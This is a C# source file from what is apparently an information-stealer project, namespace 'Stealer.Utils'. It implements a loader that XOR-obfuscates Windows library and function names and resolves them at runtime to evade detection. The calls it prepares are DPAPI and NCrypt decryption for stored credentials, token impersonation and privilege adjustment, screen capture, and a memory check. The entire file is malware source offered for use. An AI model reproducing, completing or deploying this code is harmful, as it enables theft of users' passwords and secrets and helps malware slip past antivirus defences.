using System;
using System.Linq;
using System.Runtime.InteropServices;

namespace Stealer.Utils
{
    internal static class NativeLoader
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibraryA(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        private static byte _k = 0x4B;

        internal static string S(byte[] enc)
        {
            return new string(enc.Select(b => (char)(b ^ _k)).ToArray());
        }

        internal static T Resolve<T>(byte[] libEnc, byte[] fnEnc) where T : class
        {
            IntPtr hModule = LoadLibraryA(S(libEnc));
            if (hModule == IntPtr.Zero) return null;
            IntPtr addr = GetProcAddress(hModule, S(fnEnc));
            if (addr == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(addr, typeof(T)) as T;
        }

        // crypt32.dll
        internal static readonly byte[] Lib_C32 = E("crypt32.dll");
        // advapi32.dll
        internal static readonly byte[] Lib_A32 = E("advapi32.dll");
        // ncrypt.dll
        internal static readonly byte[] Lib_NC = E("ncrypt.dll");
        // user32.dll
        internal static readonly byte[] Lib_U32 = E("user32.dll");
        // gdi32.dll
        internal static readonly byte[] Lib_G32 = E("gdi32.dll");
        // kernel32.dll
        internal static readonly byte[] Lib_K32 = E("kernel32.dll");

        // CryptUnprotectData
        internal static readonly byte[] Fn_CUD = E("CryptUnprotectData");
        // OpenProcessToken
        internal static readonly byte[] Fn_OPT = E("OpenProcessToken");
        // DuplicateTokenEx
        internal static readonly byte[] Fn_DTE = E("DuplicateTokenEx");
        // ImpersonateLoggedOnUser
        internal static readonly byte[] Fn_ILU = E("ImpersonateLoggedOnUser");
        // RevertToSelf
        internal static readonly byte[] Fn_RTS = E("RevertToSelf");
        // LookupPrivilegeValueW
        internal static readonly byte[] Fn_LPV = E("LookupPrivilegeValueW");
        // AdjustTokenPrivileges
        internal static readonly byte[] Fn_ATP = E("AdjustTokenPrivileges");
        // GetCurrentProcess
        internal static readonly byte[] Fn_GCP = E("GetCurrentProcess");
        // CloseHandle
        internal static readonly byte[] Fn_CH = E("CloseHandle");
        // NCryptOpenStorageProvider
        internal static readonly byte[] Fn_NOSP = E("NCryptOpenStorageProvider");
        // NCryptOpenKey
        internal static readonly byte[] Fn_NOK = E("NCryptOpenKey");
        // NCryptDecrypt
        internal static readonly byte[] Fn_ND = E("NCryptDecrypt");
        // NCryptFreeObject
        internal static readonly byte[] Fn_NFO = E("NCryptFreeObject");
        // GlobalMemoryStatusEx
        internal static readonly byte[] Fn_GMSE = E("GlobalMemoryStatusEx");
        // SetProcessDPIAware
        internal static readonly byte[] Fn_SDPI = E("SetProcessDPIAware");
        // GetDesktopWindow
        internal static readonly byte[] Fn_GDW = E("GetDesktopWindow");
        // GetWindowDC
        internal static readonly byte[] Fn_GWDC = E("GetWindowDC");
        // ReleaseDC
        internal static readonly byte[] Fn_RDC = E("ReleaseDC");
        // BitBlt
        internal static readonly byte[] Fn_BB = E("BitBlt");
        // GetSystemMetrics
        internal static readonly byte[] Fn_GSM = E("GetSystemMetrics");

        private static byte[] E(string s)
        {
            return s.Select(c => (byte)(c ^ _k)).ToArray();
        }
    }
}
